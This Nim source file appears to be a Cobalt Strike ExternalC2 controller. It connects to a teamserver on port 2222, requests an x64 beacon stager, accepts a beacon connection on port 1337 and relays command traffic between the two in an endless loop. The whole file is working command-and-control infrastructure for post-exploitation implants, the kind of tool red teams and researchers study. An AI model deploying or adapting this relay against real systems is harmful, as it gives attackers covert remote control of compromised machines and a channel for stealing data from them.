import std/net
import inc/struct


proc encodeFrame(data: string): string =
    var data: string = pack("<I", len(data)) & data
    return data
    
proc decodeFrame(data: string): (string,int) =

    let length = unpack("<I",data[0..<4])[0].getInt
    let body = data[4..^1]
    return (body,length)

proc CSsend(sock: Socket,data: string): void =
    sock.send(encodeFrame(data))

proc CSrecv(sock: Socket): (int,string) =
    var data_length = sock.recv(4)
    let length = unpack("<I",data_length)[0].getInt
    var data: string = ""
    while data.len < length:
        var  chunk = sock.recv(length - len(data))
        data.add(chunk)
    return (length,data)




let externalc2: Socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_IP)
externalc2.connect("teamserver.local", Port(2222))
stdout.writeLine("Connected To CS ExternalC2 at PORT 2222")


const SRVPORT = Port(1337)
let controllerC2: Socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, true)
controllerC2.bindAddr(SRVPORT)
echo "[+] Controller Server is bound to port ", SRVPORT
controllerC2.listen()



CSsend(externalc2,"pipename=pwny")
CSsend(externalc2,"block=100")
CSsend(externalc2,"arch=x64")
CSsend(externalc2,"go")


echo "[+] Requested C2 For Stager"
var (stagerlen,data) = CSrecv(externalc2)
#writeFile("new.bin", data) #checkStager
echo "[+] Stager received with Length 4 bytes : " , stagerlen
echo "[+] Stager received with Length : " , len(data)


var beacon: Socket = newSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, true)
var address = ""

controllerC2.acceptAddr(beacon, address)
echo "Client connected from: ", address
echo "First 4 bytes ",data[0..<4]

while true:

    #[SEND TO BEACON]#
    echo "[+] Send To Beacon ",len(data)," Bytes"
    CSsend(beacon,data)
    #[RECV FROM BEACON]#
    var (l,ndata) = CSrecv(beacon)
    echo "[+] Recv From Beacon ",len(ndata)," Bytes"
    #[SEND TO CS]#
    echo "[+] Send To Teamserver ",len(ndata)," Bytes"
    CSsend(externalc2,ndata)
    #[RECV FROM CS]#
    (l,ndata) = CSrecv(externalc2)
    echo "[+] Recv From TeamServer ",len(ndata)," Bytes"
    data = ndata

controllerC2.close()
externalc2.close()
